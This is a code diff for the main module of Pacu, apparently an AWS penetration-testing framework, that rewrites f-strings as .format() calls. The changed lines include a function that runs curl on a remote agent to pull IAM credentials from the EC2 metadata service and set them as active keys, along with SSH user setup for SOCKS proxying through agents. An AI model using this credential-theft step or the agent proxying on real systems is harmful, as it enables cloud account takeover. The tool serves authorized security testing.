@@ -44,23 +44,23 @@ class Main:
         timestamp = time.strftime('%F %T', time.gmtime())
 
         if session:
-            session_tag = f'({session.name})'
+            session_tag = '({})'.format(session.name)
         else:
             session_tag = '<No Session>'
 
         try:
             if session:
-                log_file_path = f'sessions/{session.name}/error_log.txt'
+                log_file_path = 'sessions/{}/error_log.txt'.format(session.name)
             else:
                 log_file_path = 'global_error_log.txt'
 
-            print(f'\n[{timestamp}] Pacu encountered an error while running the previous command. Check {log_file_path} for technical details. [LOG LEVEL: {settings.ERROR_LOG_VERBOSITY.upper()}]\n\n    {exception_info}\n')
+            print('\n[{}] Pacu encountered an error while running the previous command. Check {} for technical details. [LOG LEVEL: {}]\n\n    {}\n'.format(timestamp, log_file_path, settings.ERROR_LOG_VERBOSITY.upper(), exception_info))
 
             log_file_directory = os.path.dirname(log_file_path)
             if log_file_directory and not os.path.exists(log_file_directory):
                 os.makedirs(log_file_directory)
 
-            formatted_text = f'[{timestamp}] {session_tag}: {text}'
+            formatted_text = '[{}] {}: {}'.format(timestamp, session_tag, text)
 
             if settings.ERROR_LOG_VERBOSITY.lower() in ('low', 'high', 'extreme'):
                 if session:
@@ -351,20 +351,20 @@ class Main:
             if new_user == 'y':
                 # Create a random username that is randomly 3-9 characters
                 username = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
-                command = f'useradd -l -m -s /bin/false {username}'
-                self.print(f'Running command: {command}\n')
+                command = 'useradd -l -m -s /bin/false {}'.format(username)
+                self.print('Running command: {}\n'.format(command))
 
                 try:
                     subprocess.run(command.split(' '))
                     try:
-                        user_id = subprocess.check_output(f'id -u {username}', shell=True).decode('utf-8')
+                        user_id = subprocess.check_output('id -u {}'.format(username), shell=True).decode('utf-8')
                         if 'no such user' in user_id:
-                            self.print(f'[0] Failed to find user after creation. Here is the output from the command "id -u {username}": {user_id}\n')
+                            self.print('[0] Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id))
                             return None
-                        self.print(f'User {username} created successfully!\n')
+                        self.print('User {} created successfully!\n'.format(username))
                         return username
                     except Exception as error:
-                        self.print(f'[1] Failed to find user after creation. Here is the output from the command "id -u {username}": {user_id}\n')
+                        self.print('[1] Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id))
                         return None
 
                 except Exception as error:
@@ -376,9 +376,9 @@ class Main:
 
         else:
             try:
-                user_id = subprocess.check_output(f'id -u {ssh_username}', shell=True).decode('utf-8')
+                user_id = subprocess.check_output('id -u {}'.format(ssh_username), shell=True).decode('utf-8')
                 if 'no such user' in user_id:
-                    self.print(f'[3] Failed to find a valid SSH user. Here is the output from the command "id -u {ssh_username}": {user_id}\n')
+                    self.print('[3] Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
                     new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
                     if new_user == 'y':
                         return self.get_ssh_user(None)
@@ -387,7 +387,7 @@ class Main:
                 else:
                     return ssh_username
             except Exception as error:
-                self.print(f'[4] Failed to find a valid SSH user. Here is the output from the command "id -u {ssh_username}": {user_id}\n')
+                self.print('[4] Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
                 new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
                 if new_user == 'y':
                     return self.get_ssh_user(None)
@@ -396,23 +396,23 @@ class Main:
 
     def get_ssh_key(self, ssh_username, ssh_priv_key):
         if ssh_priv_key is None or ssh_priv_key == '':
-            new_key = self.input(f'No SSH key found for user {ssh_username}. Do you want to generate one? (y/n) ')
+            new_key = self.input('No SSH key found for user {}. Do you want to generate one? (y/n) '.format(ssh_username))
 
             if new_key == 'y':
-                self.print(f'Setting up SSH access for user {ssh_username}...\n')
-                ssh_dir = f'/home/{ssh_username}/.ssh'
-                command = f'ssh-keygen -t rsa -f {ssh_dir}/id_rsa'
+                self.print('Setting up SSH access for user {}...\n'.format(ssh_username))
+                ssh_dir = '/home/{}/.ssh'.format(ssh_username)
+                command = 'ssh-keygen -t rsa -f {}/id_rsa'.format(ssh_dir)
 
                 try:
                     self.print('Creating .ssh dir for user {ssh_username} and passing ownership...')
                     if not os.path.isdir(ssh_dir):
                         os.makedirs(ssh_dir)
-                    subprocess.run(f'chown -R {ssh_username}:{ssh_username} {ssh_dir}'.split(' '))
-                    subprocess.run(f'chmod 700 {ssh_dir}'.split(' '))
-                    self.print(f'Generating public and private SSH key...')
+                    subprocess.run('chown -R {}:{} {}'.format(ssh_username, ssh_username, ssh_dir).split(' '))
+                    subprocess.run('chmod 700 {}'.format(ssh_dir).split(' '))
+                    self.print('Generating public and private SSH key...')
                     subprocess.run(command.split(' '))
                     self.print('Creating authorized_keys file...')
-                    subprocess.run(f'cp {ssh_dir}/id_rsa.pub {ssh_dir}/authorized_keys'.split(' '))
+                    subprocess.run('cp {}/id_rsa.pub {}/authorized_keys'.format(ssh_dir, ssh_dir).split(' '))
 
                     self.print('Ensuring that local port forwarding is disabled (to prevent a "hack back" scenario)...')
                     action = ''
@@ -435,13 +435,13 @@ class Main:
                             config_file.write(contents)
                         else:
                             config_file.write(contents)
-                    with open(f'{ssh_dir}/id_rsa', 'r') as config_file:
+                    with open('{}/id_rsa'.format(ssh_dir), 'r') as config_file:
                         ssh_priv_key = config_file.read()
 
                     return ssh_priv_key
 
                 except Exception as error:
-                    self.print(f'[5] Could not setup SSH access for user {ssh_priv_key}...')
+                    self.print('[5] Could not setup SSH access for user {}...'.format(ssh_priv_key))
                     return None
 
             else:
@@ -573,14 +573,14 @@ class Main:
                     if proxy_ip == '0.0.0.0':
                         self.print('Proxy IP must be the public IP of the server to stage agents correctly and not 0.0.0.0. PacuProxy will fallback to listening on 0.0.0.0 if it fails to start a listener on the supplied IP address, but the public IP is required to send to agents so they can contact the server.')
                         return
-                    print(f'Starting PacuProxy on {proxy_ip}:{proxy_port}...')
+                    print('Starting PacuProxy on {}:{}...'.format(proxy_ip, proxy_port))
                     proxy_settings.update(self.database, ip=proxy_ip, port=proxy_port)
                     self.start_proxy()
                     proxy_listening = True
                     proxy_settings.update(self.database, listening=proxy_listening)
                     return
                 else:
-                    print(f'There already seems to be a listener running: {self.server}')
+                    print('There already seems to be a listener running: {}'.format(self.server))
             elif command[1] == 'list' or command[1] == 'ls':  # List active agent connections
                 self.server.list_connections()
             elif command[1] == 'shell':  # Run shell command on an agent
@@ -821,7 +821,7 @@ class Main:
     def import_module_by_name(self, module_name, include=()):
         file_path = os.path.join(os.getcwd(), 'modules', module_name, 'main.py')
         if os.path.exists(file_path):
-            import_path = f'modules.{module_name}.main'.replace('/', '.').replace('\\', '.')
+            import_path = 'modules.{}.main'.format(module_name).replace('/', '.').replace('\\', '.')
             module = __import__(import_path, globals(), locals(), include, 0)
             importlib.reload(module)
             return module
@@ -872,7 +872,7 @@ class Main:
                     session, global_data, local_data = self.get_data_from_traceback(tb)
                     self.log_error(
                         traceback_text,
-                        exception_info=f'{exception_type}: {exception_value}\n\nPacu caught a SystemExit error. This may be due to incorrect module arguments received by argparse in the module itself. Check to see if any required arguments are not being received by the module when it executes.',
+                        exception_info='{}: {}\n\nPacu caught a SystemExit error. This may be due to incorrect module arguments received by argparse in the module itself. Check to see if any required arguments are not being received by the module when it executes.'.format(exception_type, exception_value),
                         session=session,
                         local_data=local_data,
                         global_data=global_data
@@ -907,8 +907,8 @@ class Main:
     def list_modules(self, search_term, by_category=False):
         found_modules_by_category = dict()
         current_directory = os.getcwd()
-        for root, directories, files in os.walk(f'{current_directory}/modules'):
-            modules_directory_path = os.path.realpath(f'{current_directory}/modules')
+        for root, directories, files in os.walk('{}/modules'.format(current_directory)):
+            modules_directory_path = os.path.realpath('{}/modules'.format(current_directory))
             specific_module_directory = os.path.realpath(root)
 
             # Skip any directories inside module directories.
@@ -923,7 +923,7 @@ class Main:
             for file in files:
                 if file == 'main.py':
                     # Make sure the format is correct
-                    module_path = f'modules/{module_name}/main'.replace('/', '.').replace('\\', '.')
+                    module_path = 'modules/{}/main'.format(module_name).replace('/', '.').replace('\\', '.')
                     # Import the help function from the module
                     module = __import__(module_path, globals(), locals(), ['help'], 0)
                     importlib.reload(module)
@@ -961,7 +961,7 @@ class Main:
         if found_modules_by_category:
             for key in sorted(found_modules_by_category.keys()):
                 search_results = '\n'.join(found_modules_by_category[key]).strip('\n')
-                print(f'\n[Category: {key}]\n\n{search_results}')
+                print('\n[Category: {}]\n\n{}'.format(key, search_results))
         else:
             print('\nNo modules found.')
         print('')
@@ -969,11 +969,11 @@ class Main:
     def fetch_ec2_keys(self, target, conn):
         instance_profile = self.server.run_cmd(target, conn, 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/', mute=True)
         if not instance_profile == '' and 'not found' not in instance_profile:
-            keys = self.server.run_cmd(target, conn, f'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{instance_profile}', mute=True)
+            keys = self.server.run_cmd(target, conn, 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{}'.format(instance_profile), mute=True)
             if '"Code" : "Success",' in keys:
                 keys = json.loads(keys)
-                self.set_keys(f'Agent{target}/{time.strftime("%m-%d@%I-%M%p")}', keys['AccessKeyId'], keys['SecretAccessKey'], keys['Token'])
-                self.print(f'Keys successfully fetched from agent {target}\'s EC2 meta-data and set as the active key pair. They will expire at {keys["Expiration"]}.\n')
+                self.set_keys('Agent{}/{}'.format(target, time.strftime("%m-%d@%I-%M%p")), keys['AccessKeyId'], keys['SecretAccessKey'], keys['Token'])
+                self.print('Keys successfully fetched from agent {}\'s EC2 meta-data and set as the active key pair. They will expire at {}.\n'.format(target, keys["Expiration"]))
                 return
         self.print('Failed to fetch AWS keys from the EC2 meta-data, this agent is either not an EC2 instance or it does not have a valid instance profile attached to it to fetch the keys from.\n')
         return
@@ -989,10 +989,10 @@ class Main:
 
         # Key alias
         if key_alias is None:
-            new_value = self.input(f'Key alias [{session.key_alias}]: ')
+            new_value = self.input('Key alias [{}]: '.format(session.key_alias))
         else:
             new_value = key_alias
-            self.print(f'Key alias [{session.key_alias}]: {new_value}', output='file')
+            self.print('Key alias [{}]: {}'.format(session.key_alias, new_value), output='file')
         if str(new_value.strip().lower()) == 'c':
             session.key_alias = None
         elif str(new_value) != '':
@@ -1000,10 +1000,10 @@ class Main:
 
         # Access key ID
         if key_alias is None:
-            new_value = self.input(f'Access key ID [{session.access_key_id}]: ')
+            new_value = self.input('Access key ID [{}]: '.format(session.access_key_id))
         else:
             new_value = access_key_id
-            self.print(f'Access key ID [{session.access_key_id}]: {new_value}', output='file')
+            self.print('Access key ID [{}]: {}'.format(session.access_key_id, new_value), output='file')
         if str(new_value.strip().lower()) == 'c':
             session.access_key_id = None
         elif str(new_value) != '':
@@ -1011,7 +1011,7 @@ class Main:
 
         # Secret access key (should not be entered in log files)
         if key_alias is None:
-            new_value = input(f'  Secret access key [{session.secret_access_key}]: ')
+            new_value = input('  Secret access key [{}]: '.format(session.secret_access_key))
         else:
             new_value = secret_access_key
         self.print('Secret access key [******]: ****** (Censored)', output='file')
@@ -1022,10 +1022,10 @@ class Main:
 
         # Session token (optional)
         if key_alias is None:
-            new_value = self.input(f'Session token (Optional - for temp AWS keys only) [{session.session_token}]: ')
+            new_value = self.input('Session token (Optional - for temp AWS keys only) [{}]: '.format(session.session_token))
         else:
             new_value = session_token
-            self.print(f'Access key ID [{session.session_token}]: {new_value}', output='file')
+            self.print('Access key ID [{}]: {}'.format(session.session_token, new_value), output='file')
         if str(new_value.strip().lower()) == 'c':
             session.session_token = None
         elif str(new_value) != '':
@@ -1068,18 +1068,18 @@ class Main:
 
         for index, aws_key in enumerate(aws_keys, 1):
             if aws_key.key_alias == session.key_alias:
-                print(f'  [{index}] {aws_key.key_alias} (ACTIVE)')
+                print('  [{}] {} (ACTIVE)'.format(index, aws_key.key_alias))
             else:
-                print(f'  [{index}] {aws_key.key_alias}')
+                print('  [{}] {}'.format(index, aws_key.key_alias))
 
         choice = input('Choose an option: ')
 
         if not str(choice).strip():
-            self.print(f'The currently active AWS key will remain active. ({session.key_alias})')
+            self.print('The currently active AWS key will remain active. ({})'.format(session.key_alias))
             return
 
         if not choice.isdigit() or int(choice) not in range(1, len(aws_keys) + 1):
-            print(f'Please choose a number from 1 to {len(aws_keys)}.')
+            print('Please choose a number from 1 to {}.'.format(len(aws_keys)))
             return self.swap_keys()
 
         chosen_key = aws_keys[int(choice) - 1]
@@ -1089,7 +1089,7 @@ class Main:
         session.session_token = chosen_key.session_token
         self.database.add(session)
         self.database.commit()
-        self.print(f'AWS key is now {session.key_alias}.')
+        self.print('AWS key is now {}.'.format(session.key_alias))
 
     def check_sessions(self):
         sessions = self.database.query(PacuSession).all()
@@ -1167,7 +1167,7 @@ class Main:
         proxy_settings = self.get_proxy_settings()
 
         boto_config = botocore.config.Config(
-            proxies={'https': f'socks5://127.0.0.1:{socks_port}', 'http': f'socks5://127.0.0.1:{socks_port}'} if not proxy_settings.target_agent == [] else None,
+            proxies={'https': 'socks5://127.0.0.1:{}'.format(socks_port), 'http': 'socks5://127.0.0.1:{}'.format(socks_port)} if not proxy_settings.target_agent == [] else None,
             user_agent=user_agent,  # If user_agent=None, botocore will use the real UA which is what we want
             parameter_validation=parameter_validation
         )
@@ -1187,7 +1187,7 @@ class Main:
         proxy_settings = self.get_proxy_settings()
 
         boto_config = botocore.config.Config(
-            proxies={'https': f'socks5://127.0.0.1:{socks_port}', 'http': f'socks5://127.0.0.1:{socks_port}'} if not proxy_settings.target_agent == [] else None,
+            proxies={'https': 'socks5://127.0.0.1:{}'.format(socks_port), 'http': 'socks5://127.0.0.1:{}'.format(socks_port)} if not proxy_settings.target_agent == [] else None,
             user_agent=user_agent,
             parameter_validation=parameter_validation
         )
@@ -1226,7 +1226,7 @@ class Main:
                         MODULES.append(module_name)
 
                         # Make sure the format is correct
-                        module_path = f'modules/{module_name}/main'.replace('/', '.').replace('\\', '.')
+                        module_path = 'modules/{}/main'.format(module_name).replace('/', '.').replace('\\', '.')
 
                         # Import the help function from the module
                         module = __import__(module_path, globals(), locals(), ['help'], 0)
@@ -1404,7 +1404,7 @@ class Main:
                         session, global_data, local_data = self.get_data_from_traceback(tb)
                         self.log_error(
                             traceback_text,
-                            exception_info=f'{exception_type}: {exception_value}\n\nPacu caught a SystemExit error. This may be due to incorrect module arguments received by argparse in the module itself. Check to see if any required arguments are not being received by the module when it executes.',
+                            exception_info='{}: {}\n\nPacu caught a SystemExit error. This may be due to incorrect module arguments received by argparse in the module itself. Check to see if any required arguments are not being received by the module when it executes.'.format(exception_type, exception_value),
                             session=session,
                             local_data=local_data,
                             global_data=global_data
@@ -1414,7 +1414,7 @@ class Main:
                     session, global_data, local_data = self.get_data_from_traceback(tb)
                     self.log_error(
                         traceback_text,
-                        exception_info=f'{exception_type}: {exception_value}',
+                        exception_info='{}: {}'.format(exception_type, exception_value),
                         session=session,
                         local_data=local_data,
                         global_data=global_data
